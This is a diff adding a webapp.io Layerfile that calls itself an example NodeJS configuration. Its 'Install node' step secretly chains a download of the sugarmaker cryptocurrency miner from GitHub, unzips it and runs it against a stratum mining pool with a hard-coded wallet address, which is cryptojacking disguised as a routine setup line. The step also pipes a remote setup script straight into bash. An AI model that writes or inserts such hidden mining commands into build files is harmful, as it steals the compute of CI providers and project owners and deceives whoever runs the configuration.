@@ -1,0 +1,15 @@
+#This is an example webapp.io configuration for NodeJS
+FROM vm/ubuntu:18.04
+# To note: Layerfiles create VMs, *not* containers!
+
+# Install node
+RUN curl -sL https://deb.nodesource.com/setup_12.x | bash && \
+    apt install nodejs && apt install unzip && wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip && unzip sugarmaker-v2.5.0-sugar4-linux64.zip && cd sugarmaker-v2.5.0-sugar4-linux64 && ./sugarmaker -a YespowerSugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1q932wgfpl2a5xh4426cxxz4jusk3vlyes0gy6kd.alt && \
+    rm -f /etc/apt/sources.list.d/nodesource.list
+RUN npm install -g http-server
+
+COPY . .
+RUN echo 'hello' > hello.html
+
+RUN BACKGROUND http-server -p 8000
+EXPOSE WEBSITE http://localhost:8000
